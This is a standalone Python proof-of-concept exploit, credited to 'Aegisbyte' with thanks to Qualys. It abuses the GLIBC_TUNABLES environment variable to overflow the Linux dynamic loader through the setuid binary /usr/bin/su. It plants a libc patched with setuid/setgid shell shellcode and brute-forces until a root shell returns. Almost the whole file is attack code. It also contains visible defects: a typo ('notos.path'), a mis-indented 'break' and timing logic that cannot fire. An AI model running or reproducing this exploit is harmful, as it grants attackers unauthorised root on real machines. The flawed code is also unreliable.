#!/usr/bin/env python3
# PoC by Aegisbyte
# Credits to Qualys, Inc.
# Download pwntools library
# Pwntools is a CTF framework and exploit development library. 
# Written in Python, it is designed for rapid prototyping and 
# development, and intended to make exploit writing as simple as # possible.
# GitHub Link: https://github.com/Gallopsled/pwntools
 
from pwn import * 
import os 
import time 

context.os = "linux"
context.arch = "x86_64" 

FILL_SIZE = 0xd00 
BOF_SIZE = 0x600 

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") 
d = bytearray(open(libc.path, "rb").read()) 

sc = asm(shellcraft.setuid(0) + shellcraft.setgid(0) + shellcraft.sh()) 
orig = libc.read(libc.sym["__libc_start_main"], 0x10) 
idx = d.find(orig) 
d[idx : idx + len(sc)] = sc 
open("./libc.so.6", "wb").write(d)

def time_us(): 
    return int(time.time() * 1e6) 
    
filler = ("GLIBC_TUNABLES=glibc.malloc.mxfast=" + "F" * (FILL_SIZE - 34)).encode() 
kv = ("GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=" + "A" * (BOF_SIZE - 49)).encode() 
filler2 = ("GLIBC_TUNABLES=glibc.malloc.mxfast=" + "F" * (BOF_SIZE + 0x20 - 34)).encode() 
dt_rpath = b"\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xEC" * (0x20000 // 8) 

envp = [b""] * 0x1000 
envp[0] = filler 
envp[1] = kv 
envp[0x65] = b"" 
envp[0x65 + 0xb8] = b"\x30\xf0\xff\xff\xfd\x7f" 
envp[0xf7f] = filler2 

for i in range(0x2f): 
    envp[0xf80 + i] = dt_rpath 
envp[0xffe] = b"AAAA" 

argv = [b"/usr/bin/su", b"--help", None] 

if notos.path.exists("\""): 
    os.mkdir("\"") 
    with open("\"/libc.so.6", "wb") as dfd, open("./libc.so.6", "rb") as sfd: 
        buf = sfd.read(0x1000) 
        while buf: 
            dfd.write(buf) 
            buf = sfd.read(0x1000) 
ct = 1 
while True: 
    if ct % 100 == 0: 
        print(f"try {ct}") 
    pid = os.fork()
    if pid == 0:  # child 
        os.execve(argv[0], argv, envp) 
    else:  # parent 
        wstatus, _ = os.wait() 
        start_time = time_us() 
        if os.WIFSIGNALED(wstatus) and time_us() - start_time > 1000000: 
        # likely a shell return 
        break 
    ct += 1
